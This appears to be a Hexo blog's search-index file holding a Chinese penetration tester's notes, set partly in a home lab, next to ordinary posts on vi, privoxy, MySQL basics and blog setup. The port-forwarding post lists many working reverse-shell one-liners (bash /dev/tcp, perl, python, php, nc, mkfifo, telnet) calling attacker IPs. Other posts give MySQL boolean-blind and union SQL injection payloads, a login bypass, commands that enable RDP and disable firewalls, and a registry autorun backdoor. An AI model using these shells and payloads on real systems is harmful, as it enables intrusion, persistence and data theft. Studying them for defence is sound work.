    <content type="text"><![CDATA[如题 rar.exe的使用方法压缩命令1234567891011121314151617181920212223压缩文件夹（不包含子目录）：rar.exe a &quot;压缩包保存路径文件名&quot; &quot;被压缩的文件夹路径&quot;压缩文件夹（包含子目录）：rar.exe a -r &quot;压缩包保存路径文件名&quot; &quot;被压缩的文件夹路径&quot;压缩文件夹（以时间命名压缩包）：rar.exe a -ag -r -s -ibck &quot;压缩包保存路径（记得在最后加\）&quot; &quot;被压缩的文件夹路径&quot;加密压缩文件夹（以时间命名压缩包，密码：123）：rar.exe a -ag -r -s -ibck -p123 &quot;压缩包保存路径&quot; &quot;被压缩的文件夹路径&quot;带文件头的加密压缩：rar.exe a -ag -r -s -ibck -HP123 &quot;压缩包保存路径&quot; &quot;被压缩的文件夹路径&quot;压缩多个文件（以时间命名压缩包）：rar.exe a -ag -ibck &quot;压缩包保存路径（记得在最后加\）&quot; &quot;文件名1&quot; &quot;文件名2&quot;压缩指定文件类型（exe）：rar.exe a -ag -r -s -ibck &quot;压缩包保存路径（记得在最后加\）&quot; &quot;被压缩的文件夹路径\*.exe&quot;压缩含有指定字符的文件（匹配test）：rar.exe a -ag -r -s -ibck &quot;压缩包保存路径（记得在最后加\）&quot; &quot;被压缩的文件夹路径\*test*&quot; 解压命令1234567891011解压RAR到当前目录（无提示带路径）：rar.exe X -Y &quot;压缩文件名&quot;解压RAR到指定目录（无提示带路径）：rar.exe X -Y &quot;压缩文件名&quot; -AD &quot;指定目录&quot;解压RAR中指定文件类型（exe）到当前目录（无提示带路径）：rar.exe X -Y &quot;压缩文件名&quot; *.exe解压RAR中指定文件类型（exe）到指定目录（无提示带路径）：rar.exe X -Y &quot;压缩文件名&quot; *.exe -AD &quot;指定目录&quot; [语法]123RAR &lt;命令&gt; [ -&lt;开关1&gt; -&lt;开关N&gt; ] &lt;压缩文件&gt; [ &lt;@列表文件...&gt; ]RAR [ &lt;文件...&gt; ] [ &lt;解压路径/&gt; ] 简要参数说明：12345678910111213141516171819a :备份所有文件；-ag :当创建压缩文件时，以格式“YYYYMMDDHHMMSS”附加当前日期字符串,文件名YYYYMMDDHHMMSS.rar；-k :锁定压缩文件；-r:备份目录和子目录；-s :创建固实压缩文件，提高压缩率；-ibck :后台运行；X ：从压缩包中带绝对路径解压指定文件到当前路径-Y ：覆盖已存在文件-p ：加密压缩，解压时需要密码-HP ：带文件头加密，更安全，没有密码无法查看里面的文件列表]]></content>
      <categories>
        <category>工具使用说明</category>
      </categories>
      <tags>
        <tag>工具使用说明</tag>
        <tag>rar.exe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网攻击环境模拟（端口转发）]]></title>
    <url>%2F2017%2F09%2F05%2FportForward%2F</url>
    <content type="text"><![CDATA[如题 内网攻击环境模拟（端口转发）测试工具：123456789htran3fpipelcxnc（linux、windows）bashpythonphpnc 无essh代理 总体环境概况（总的环境，具体每个工具使用时可能会有所出入）： 123456攻击机：ubu_ter 192.168.20.149攻击机：win10 192.168.20.191 192.168.20.76服务器：ubu_blog 192.168.20.111 192.168.174.11服务器：server2003 192.168.174.129 192.168.20.181目标机：Ubuntu2 192.168.174.128目标机：winXP 192.168.174.130 实验一、使用htran.exe远程登录目标winXP的33891234567891011**环境：**攻击机（个人笔记本，内网）：Ubuntu2 192.168.20.145攻击机（VPS，公网）：win10 192.168.20.191 192.168.20.76服务器（公网，目标内网）：server2003 192.168.174.129 192.168.20.181目标机（目标内网）：winXP 192.168.174.130**步骤：**攻击机win10上执行：htran3.exe -Listen 9999 8888服务器server2003上执行：htran3.exe -slave 192.168.20.191 9999 192.168.174.130 3389用法：htr3.exe -slave 攻击机IP 攻击机监听端口 目标机IP 目标机端口将目标机的3389端口转发到本地的8888端口，使用另一台攻击机Ubuntu2的rdesktop连接win10的8888端口即可 实验二、使用fpipe远程登录目标winXP的338912345678910111213**环境：**攻击机（VPS，公网）：win10 192.168.20.191 192.168.20.76攻击机（个人笔记本，内网）：Ubuntu2 192.168.20.145服务器（公网，目标内网）：server2003 192.168.174.129 192.168.20.181目标机（目标内网）：winXP 192.168.174.130**步骤：**在服务器上执行：fpipe.exe -l 1234 -s 1000 -r 3389 192.168.174.130意思是将发送到服务器本机1000端口的链接通过1234端口被重定向到了目标机IP的3389端口上，然后再链接服务器的1234端口，即可链接到目标机的3389上然后在攻击机上使用mstsc链接192.168.20.181:1234疑惑：在攻击机win10上使用mstsc进行链接，刚建立连接就会断开在攻击机ubuntu2上使用rdesktop进行链接，成功建立长时间连接 实验三、使用lcx远程登录目标winXP的3389123456789101112**环境：**攻击机（VPS，公网）：win10 192.168.20.191 攻击机（个人笔记本，内网）：Ubuntu2 192.168.20.145服务器（公网，目标内网）：server2003 192.168.174.129 192.168.20.181目标机（目标内网）：winXP 192.168.174.130**步骤：**先在win10上：lcx.exe -listen 51 3389监听51端口，转发到本机的3389端口然后在服务器上执行：lcx.exe -slave 192.168.20.191 51 192.168.174.130 3389将目标机winXP的3389转发到攻击机win10（VPS）的51端口上在攻击机Ubuntu2上：rdesktop 192.168.20.191:3389 实验四、使用nc得到服务器server2003的cmdShell12345678**环境：**攻击机：win10 192.168.20.191 服务器（公网，目标内网）：server2003 192.168.174.129 192.168.20.181目标机（目标内网）：winXP 192.168.174.130**步骤：**在服务器server2003上：nc -l -p 8888 -t -e cmd.exe（-t参数可省略）在攻击机win10上：nc -nvv 192.168.20.181 8888 实验五、使用nc得到服务器ubu_blog的shell12345678910111213141516171819202122232425262728293031323334353637**环境：**攻击机：Ubuntu2 192.168.20.145服务器：ubu_blog 192.168.20.111 192.168.174.11目标机：Ubuntu2 192.168.174.128**步骤：**在攻击机Ubuntu2上：nc -lvv 1234（如果有错再添加0.0.0.0，windows不行，-lvnp也可以）在服务器ubu_blog上：（1）bash版本bash -i &gt;&amp;/dev/tcp/192.168.20.149/1234 0&gt;&amp;1或： /bin/bash -i &gt; /dev/tcp/192.168.20.149/1234 0&lt;&amp;1 2&gt;&amp;1（2）perl版本perl -e &apos;use Socket;$i=&quot;192.168.20.149&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;（3）python版本python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.20.149&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;（4）php版本php -r &apos;$sock=fsockopen(&quot;192.168.20.149&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;（5）nc -e /bin/sh 192.168.20.149 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.20.149 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999（6）JAVA版本（不会用）r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.20.149/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()（7）LUA版本（尝试失败）lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;192.168.20.149&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;（8）Hacker:nc -lvnp listenportVictim:mknod /tmp/backpipe pVictim:/bin/sh 0&lt;/tmp/backpipe | nc 192.168.20.149 1234 1&gt;/tmp/backpipe（9）不使用ncMethod 2:Hacker: nc -nvlpp8080Victim: mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe（10）Method 3:（尝试失败）Hacker: nc -nvlp 8080Hacker: nc -nvlp 8888Victim: telnet 192.168.20.149 8080 | /bin/bash | telnet 192.168.20.149 8888 实验六、SSH代理（putty）1234567891011**环境：**代理服务器：ubu_ter 192.168.17.128（仅主机模式，不可上网）本地机：win10 192.168.20.191（可上网），192.168.17.1**步骤：**打开putty的会话界面，填入主机名称和端口然后在左侧：连接——》SSH——》通道——》增加端口：7070，动态——》打开输入用户名和密码，登陆成功此时打开cmd，输入netstat -an，可以看到这么一条打开浏览器，在浏览器中设置代理：socks5 127.0.0.1:7070此时浏览器变得无法上网，设置成功]]></content>
      <categories>
        <category>端口转发</category>
      </categories>
      <tags>
        <tag>端口转发</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下使用privoxy将socks转换为http代理]]></title>
    <url>%2F2017%2F09%2F04%2FsocksTOhttp%2F</url>
    <content type="text"><![CDATA[shadowsocks是socks5代理，但有的程序不支持socks代理（终端），只支持HTTP代理，怎么办呢？这个时候我们就需要将socks代理转换为http代理了。 linux下使用privoxy将socks转为http代理privoxy具有将socks代理转为http代理的功能。 1.开启shadowsocks根据自己SS的配置来 2.安装privoxy。1$ sudo apt-get install privoxy 3.更改provoxy配置12345位置在“/etc/privoxy/config”。$ sudo vim /etc/privoxy/config在里面添加：forward-socks5 / 127.0.0.1:1080 .listen-address localhost:8118 4.重启privoxy。1$ service privoxy restart 5.现在就可以使用http代理1http_proxy=http://localhost:8118 curl ip.gs 查看当前ip。 终端想使用代理就在每条命令前加上“http_proxy=http://localhost:8118”即可]]></content>
      <categories>
        <category>代理</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>代理</tag>
        <tag>privoxy</tag>
        <tag>shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vi使用笔记]]></title>
    <url>%2F2017%2F09%2F04%2Fvi-sum-up%2F</url>
    <content type="text"><![CDATA[如题 VI使用笔记文本查找12345678910111213/ 向下查找，输入n可以按相同的方向继续查找，N向相反的方向继续查找（notepad用F3）? 向上查找，同上，搜索字符串中如果包含由特殊含义的字符需要在前面加上\f 向下搜索某行中的单个字符F 向上搜索某行中的单个字符t 向下搜索，并把光标定位到匹配字符的前面T 向上搜索，并把光标定位到匹配字符的后面部分特殊字符列表：^ 匹配一行的开头. 匹配一个字符* 匹配0个或多个字符$ 匹配一行的结尾[] 匹配一组字符 移动光标：12h 向左 j 向下 k 向上 l 向右例：普通模式下输入3j，会向下移动3行 复制粘贴：12345yy 复制当前行nyy 复制n行yw 复制一个字（单词）p 将复制的文本粘贴到光标后面P 将复制的文本粘贴到光标前面 文本替换：123:s/search/replace/g 将当前行的所有search替换为replace:n,$s/old/new/g 将从第n行开始到最后一行的所有old替换为new（n若是&quot;.&quot;，表示从当前行开始到最后一行）:n,$s/old/new 将从第n行开始到最后一行的每一行的第一个old替换为new 模式切换：12两次ESC回到普通模式ZZ 保存并退出，方便快捷 插入字符：123456i 光标的前面插入I 当前行的开头插入文本a 光标的后面插入A 当前行的末尾插入文本o 在当前行的下一行插入空行O 在当前行的上一行插入空行 删除字符：1234567x 删除当前光标下的字符X 删除光标前面的字符dw 删除从当前光标到单次解围的字符d^ 删除从当前光标到行首的字符d$ 删除从当前光标到行尾的字符D 删除从当前光标到行尾的字符dd 删除当前光标所在的行，3dd删除3行 修改字符：1234567cc 删除当前行并进入编辑模式C 当前行的光标所在位置清空并进行编辑cw 删除当前字（单词），并进入编辑模式r 替换当前光标下的字符（替换单个字母用）R 从当前光标开始替换字符，按ESC退出s 用输入的字符替换当前字符，并进入编辑模式S 用输入的文本替换当前行，并进入编辑模式 屏幕移动：123H移动到屏幕顶部，nH移动到屏幕第n行的位置M移动到屏幕中间L移动到屏幕底部 文章移动命令：12345678910gg跳到文档开头G跳到文档结尾，1G 或 :1 移动到文件第一行0或|回车，跳到当前行开头$跳到当前行结尾w定位到上一个单词b定位到下一个单词(定位到一句话的开头，句子是以!.?三种符号来界定)定位到一句话的结尾&#123;移动到段落开头&#125;移动到段落结尾 控制命令：1234567ctrl+d 向后滚动半屏ctrl+f 向后滚动全屏ctrl+u 向前滚动半屏ctrl+b 向前滚动整屏ctrl+e 向下滚动一行ctrl+y 向上滚动一行ctrl+I（大写的i）刷新屏幕 高级命令1234567891011121314151617J 将当前行和下一行链接为一行&lt;&lt; 将当前行左移一个单位（一个缩进宽度）&gt;&gt; 将当前行右移一个单位~ 改变当前字符的大小写ctrl+G 可以显示当前文件名和状态U 撤销对当前行所做的修改u 撤销上次操作:f 以百分比的形式显示当前光标在文中的位置、文件名和文件的总行数:f filename 将文件重命名为filename:w filename 保存修改到filename:e filename 打开另一个名为filename的文件:cd dirname 改变当前工作目录到dirname:e # 在的两个打开的文件之间进行切换:n 如果用vi打开了多个文件，切换到下一个文件:p 如果用vi打开了多个文件，切换到上一个文件:r file 读取文件并在当前行的后面插入:nr 读取文件并在第n行后面插入]]></content>
      <categories>
        <category>vi</category>
      </categories>
      <tags>
        <tag>vi</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql布尔盲注payload]]></title>
    <url>%2F2017%2F08%2F26%2FboolBlandSQLInjection%2F</url>
    <content type="text"><![CDATA[如题所示 payload12345678910111213141516#判断当前数据库长度?id=12&apos; and (select length(database())&gt;5) --+#判断当前数据库名?id=12&apos; and (select ascii(substr(database(),1,1))&gt;=97) --+#判断第一个表的表长度?id=12&apos; and (select length(table_name)&gt;5 from information_schema.tables where table_schema=database() limit 0,1) --+ #判断第二个表名?id=12&apos; and (select ascii(substr(table_name,1,1))&gt;97 from information_schema.tables where table_schema=database() limit 1,1) --+ #判断users表的第一个字段长度?id=12&apos; and (select length(column_name)&gt;1 from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 0,1) --+ #判断users表的第一个字段名?id=12&apos; and (select ascii(substr(column_name,1,1))&gt;65 from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 0,1) --+ #判断username列的第一条数据长度?id=12&apos; and (select length(username)&gt;1 from users limit 0,1) --+ #判断username列的第一条数据?id=12&apos; and (select ascii(substr(username,1,1))&gt;=65 from users limit 0,1) --+]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>布尔盲注</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL手工联合查询注入]]></title>
    <url>%2F2017%2F08%2F26%2FMySQLUnionInjection%2F</url>
    <content type="text"><![CDATA[内容如题 PHP+MySQL简单手工注入基本流程一、判断是否存在注入1234567891011SQL注入按类型分为两种：数字型和字符型判断方法的区别：字符型用&apos;判断，数字型用and 1=1 和and 1=2判断注释方法：# 编码后为%23，hash语法-- s 后跟空格后面随意写字符，又例：--+-- - SQL语法;%00 可以使用，空字节/* 必须闭合，C-style语法 · 反引号（左上角的字符） 判断sql注入（显错和基于错误的盲注）：单引号，and 1=1 和and 1=2，双引号，反斜杠，注释等 判断基于时间的盲注:在上面的基础上，加个sleep函数 ，如sleep(5) (函数不同数据库有所不同)例子： &apos; and sleep(5) &quot; and sleep(5) 二、判断有几列数据1234567891011121314151617order by 1 #一直到出现错误为止and 1=2 union select 1,2 #一直到成功为止，一般页面会出现显示位，出现显示位的地方可以放我们想要放的东西，例如：user(),database(),@@version，则会在显示位出现连接的用户、数据库、版本等信息可以放的东西：database(),schema() #数据库名user(),current_user(),current_user,system_user(),session_user() #用户@域名@@version,version(),@@global.version #mysql版本信息@@basedir #mysql安装路径@@datadir #数据库存放路径@@hostname #主机名@@version_compile_os; #操作系统指纹@@global.version_compile_os #感觉和上面差不多now() #当前时间：年月日时分秒current_date #当前时间：年月日char() #指定字符load_file() #读取指定文件ord(mid(user(),1,1))=114 #系统权限，正常返回说明为root小工具：火狐F9——》SQL——》union select statement——》输入数字，直接出现联合查询，方便爆出列数 三、得到数据库名1234561、使用database()直接得到当前数据库名2.1 如果database()被过滤，则使用union select 1,schema_name,3,4,5,6 from information_schema.schemata limit 0,1 查看数据库名，可以通过Limit设置显示第几行，也就可以显示其他的数据库名。根据数据库名爆表名（如果database()）被过滤 2.2 UNION SELECT 1,group_concat(schema_name),3,database(),5,6 from information_schema.schemata 显示所有数据库名，函数group_concat是显示所有 2.3 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; MySQL 4版本时用version=9，MySQL 5版本时用version=10 Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息 四、得到表名1231、UNION SELECT 1,table_name,3,4,5,6 from information_schema.tables where table_schema=&apos;s10&apos; limit 0,1 #显示s10数据库的表名，一个一个来2、union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=&apos;s10&apos; #显示s10数据库的表名，全部显示3、SELECT table_name FROM information_schema.tables WHERE table_name LIKE &apos;%user%&apos; #查询包含user的表 五、得到列名12341、UNION SELECT 1,2,3,database(),5,column_name from information_schema.columns where table_schema=&apos;s10&apos; and table_name=&apos;users&apos; limit 0,1 #查询列名，一个一个来2、union select 1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_schema=&apos;s10&apos; and table_name=&apos;users&apos; #查询列名，一次全部显示3、SELECT column_name FROM information_schema.columns WHERE table_name LIKE &apos;%user%&apos; #查询包含user的列4、SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE() 获得第一个段名 1 LIMIT 1,1 PROCEDURE ANALYSE() 获得第二个段名 1 LIMIT 2,1 PROCEDURE ANALYSE() 获得第三个段名 #这个需要web展示页面有你所注入查询的一个字段。 六、得到想要的数据1231、union select 1,username,password,4,5,6 from users; #在不同的显示位显示需要的内容2、union select 1,concat(userename,0x23,password),3,4,5,6 from users; #函数concat可以联合显示数据，0x23是分隔符3、union select 1,concat_ws(0x23,username,email,age,password),3,4,5,6 from users #函数concat_ws只写一次分隔符即可]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>联合查询</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开启3389命令]]></title>
    <url>%2F2017%2F08%2F26%2Fopen3389%2F</url>
    <content type="text"><![CDATA[远程cmd开启3389，以及开启成功依旧不能登录的解决方法 开启命令：12345678910111213141516正常命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f远程使用时，需要变为双斜杠：REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f查看远程连接端口号REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber添加后门：Reg enumkey –k HKLM\\software\\microsoft\\windows\\currentVersion\\run 查看注册表的自启动项Reg setval –k 注册表路径 –v 文件名 –d “文件路径” 将后门添加到注册表启动项关闭TCP/IP端口筛选 (需重启) tcp/ip筛选是让用户设置电脑的可接收和不能接收的TCP/IP端口，保证安全REG ADD HKLM\SYSTEM\ControlSet001\Services\Tcpip\parameters /v EnableSecurityFilters /t REG_DWORD /d 0 /f更改终端端口为3800(0x0ED8)REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x0ED8 /fREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x0ED8 /f 开启失败可以尝试：关闭ip安全策略： 1cmd /c net stop policyagent 将IPSEC Services服务停了 防火墙相关： 12345678910111213141516查看防火墙状态：netsh firewall show state禁用防火墙（以管理员运行）：netsh firewall set opmode disable启用防火墙：netsh firewall set opmode enable防火墙重置：netsh advfirewall reset允许文件和打印共享 ：netsh firewall add portopening UDP 137 Netbios-ns (允许客户端访问服务器UDP协议的137端口) netsh firewall add portopening UDP 138 Netbios-dgm (允许访问UDP协议的138端口) netsh firewall add portopening TCP 139 Netbios-ssn (允许访问TCP协议的139端口) netsh firewall add portopening TCP 445 Netbios-ds (允许访问TCP协议的445端口) 添加3389对外开放规则：netsh firewall set portopening TCP 3389 ENABLE 允许netsh firewall set portopening TCP 3389 DISABLE 禁止]]></content>
      <categories>
        <category>3389</category>
      </categories>
      <tags>
        <tag>3389</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库基础学习]]></title>
    <url>%2F2017%2F08%2F26%2Fmysql-basic%2F</url>
    <content type="text"><![CDATA[罗列了一些MySQL的常用语句命令，可以进来看看1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586select user,host,password from mysql,user #查看mysql的用户和密码mysql -hlocalhost -uroot -p #连接数据库show databases; #显示数据库select database(); #显示当前使用的数据库select user(); #显示当前用户select version(): 或者select @@version; #显示版本use 数据库名; #选择数据库select @@basedir; #显示mysql安装路径select @@datadir; #显示数据库存放的路径select @@hostname; #显示主机名select @@version_compile_os; #显示mysql操作系统版本select now(); #显示当前时间create database 数据库名 character set utf8; #创建数据库drop database 数据库名; #删除数据库create table users(id int(10) unsigned not null primary key auto_increment, username varchar(30) not null, email varchar(30) not null, password varchar(32) not null)default charset=utf8; #创建表（id是无符号整数类型）create table me like users; #创建表me，结构与users表一致show tables; #查看表desc users; #查看表结构insert into users(username,email,password) values('admin','1','123'); #插入表数据select hex('admin') #查看admin字符的16进制，使用时前面加上0x，例：select * from users where user=0x61646d696e;select * from users limit 2; #查询前两条信息select * from users limit 2,2; #查询第三条和第四条两条（从第三条开始，查询两条）select * from users where username like '%admin%'; #查询用户名包含admin的所有信息（这里的%是like查询中的通配符，用来匹配所有字符，所以用户名中包含admin的全部都能显示出来）select * from users where username='admin'; #查询用户名是admin的信息update users set username='admin' where id=1; #修改id为1的用户名为admindelete from users where id=12; #删除id为12的数据select * from users where id=1 union select * from users where id=3; #联合查询，可以查询多条，要求各边查询的列数一致select * from users order by 1; #根据第一列排序（可以以此为查询列数的依据）select * from users where id=-1 union select 1,2,user(),4; #联合查询，只显示后面的查询结果，前面的查询结果为空，所以不显示select * from users where id=1 and 1=2 union select 1,2,user(),4; #同上create table ec_users(id int(10) primary key auto_increment,username varchar(32) not null,count_tmp float not null,dept varchar(32) not null)default charset=utf8; #创建表select dept,count(*) from ec_users where count_tmp&gt;=90 group by dept having count(dept)&gt;1; #统计每个部门成绩大于90的人数select DISTINCT username from ec_users; #distinct用来去除重复数据select all dept from ec_users #all表示查询所有（默认为all，重复的也显示）select * from ec_users where dept is null #查询部门值为空select * from ec_users where dept is not null #查询部门值不为空select * from ec_users where id BETWEEN 3 and 5 #查询id为3~5之间的数据select * from ec_users where id in(1,2,6) #查询id值为1,2,6的数据（过waf有用）select * from ec_users where id=1 or 'a' in ('b','a'); #过waf用，后面恒为真，'a'字符存在在in('a')里select * from ec_users where id=1 &amp;&amp; id&lt;3; #查询id=1且id&lt;3的select * from ec_users where id=1 | id&lt;3; #过waf用一个|或一个&amp;可以显示select * from ec_users where id xor 0; #异或，两个均为真显示0，两个不同为1select * from ec_users where id not in(1,2,3) #not与！是一个用处，可以用在in、likealter table users add age int(3) not null; #添加列alter table users modify age int(4) #修改列的数据类型为int(4)alter table users change age age int(3) #同上，也是修改列的数据类型，只是需要写两次列名alter table users rename ress; #修改表名alter table users rename as ress; #同上，也是修改表名select count(*) from information_schema.tables #返回系统表里的数据个数select rand() #返回0~1之间的随机浮点数select rand()*4 #返回0~4之间的随机浮点数select floor(rand()*4) #随机生成0~4（不可能是4）之间的整数 select floor(rand()*4）as dumb #并命名为dumb列（as可省略）#if用法：select if (判断条件,'语句1','语句2') #条件为真执行语句1，条件为假执行语句2#十六进制：SELECT 0x5045 #(这不是一个整数，而会是一个16进制字符串）SELECT 0x50 + 0x45 #(现在这是整数了)select concat('0x',hex('c:\\boot.ini')) #另类的使用十六进制方式#字符串的串联|| 仅在ANSI模式下的MySQL执行，其他情况下都会当成逻辑操作符并返回0，建议使用下面函数concat() concat_ws() group_concat()#绕过MD5哈希检查的例子用户名：admin密码：1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055其中81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)grant 权限1,权限2...,权限n on 数据库名.表名 to 用户名@用户地址 identified by '连接口令'； 赋给用户权限,权限被all privileges或all替代，表示赋给用户全部权限；数据库名.表名被*替代，表示赋给用户操作服务器上所有数据库所有表的权限；用户地址可以使ip地址、机器名、域名，也可以用%表示从任何地址连接；连接口令不能为空，否则创建失败；后面可以加with grant option对象授权，权限传递（我也不懂，就是这么说的）例： GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION; flush privileges; #刷新系统权限表show variables like "secure_file_priv" #查看可写目录]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu+hexo+Github博客简单搭建流程]]></title>
    <url>%2F2017%2F08%2F25%2Fblog-step%2F</url>
    <content type="text"><![CDATA[自己博客的基本搭建流程，不包含主题的美化 搭建开始1、安装nodejs1234curl -sL https://deb.nodesource.com/setup_4.x | sudo -E bash -sudo apt-get install -y nodejsnode -v #检查版本v 4.4.5 2、安装git123apt-get install gitgit --version #检查版本git version 2.7.4 3、安装npm1apt-get install npm 4、使用npm安装hexo1npm install -g hexo-cli 5、创建一个博客文件夹，进入文件夹中1234hexo initnpm installhexo -v #此时博客已经创建成功hexo server #看看效果把（浏览器中输入：ip:4000，如果4000端口被占用，hexo server -p 其他端口） 6、创建一个github账户，新建一个和用户名对应的仓库，格式固定：用户名.github.io 7、修改站点配置文件_config.yml123456language: zh-Hans 设置成中文deploy: type: git repository: git@github.com:maplege/maplege.github.io.git branch: master message: '站点更新:&#123;&#123;now("YYYY-MM-DD HH:mm:ss")&#125;&#125;' 8、然后执行下面的命令1npm install hexo-deployer-git --save 9、生成SSH密钥123$ cd ~/. ssh #检查本机已存在的ssh密钥如果提示：No such file or directory 说明你是第一次使用git。ssh-keygen -t rsa -C "邮件地址" 然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; Deploy keys -&gt; Add deploy key：将刚复制的内容粘贴到key那里，title随便填，保存。 10、进行git全局配置12git config --global user.email "you@example.com"git config --global user.name "Your Name" 11、上传到github空间中123hexo cleanhexo ghexo d 至此，博客搭建完毕]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
</search>
